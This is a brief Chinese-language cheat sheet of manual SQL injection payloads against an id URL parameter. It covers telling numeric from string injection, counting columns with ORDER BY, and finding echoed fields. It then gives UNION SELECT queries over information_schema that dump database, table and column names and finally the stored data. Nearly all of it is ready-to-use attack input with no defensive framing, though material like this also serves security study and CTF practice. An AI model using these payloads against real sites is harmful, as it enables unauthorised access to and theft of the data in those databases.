---
tags:
  - 技巧
  - sql注入
---
### 判断类型

数字型：

```sql
1 and 1=1 //查出数据
1 and 1=2 //查不出数据
```

字符型：
```sql
1' and '1' = '1 //查出数据
1' and '1' = '2 //查不出数据
```


### 判断列数

```sql
[前面加上判断类型时的语句]order by [后面使用1，2，3...去尝试]#
```

### 判断能注入的字段

那个位置有回显就说明这个字段可以注入
```sql
?id=-1 union select 1,2,3...[有几列写几个]# 
```

**爆库**
```sql
?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata
```

**爆表**
```sql
?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='已知库名'
```

**爆列**
```sql
?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='已知表名'
```

**获取数据**
```sql
?id=-1 union select 1,2,group_concat(已知字段名,':',已知字段名) from 已知表名
```


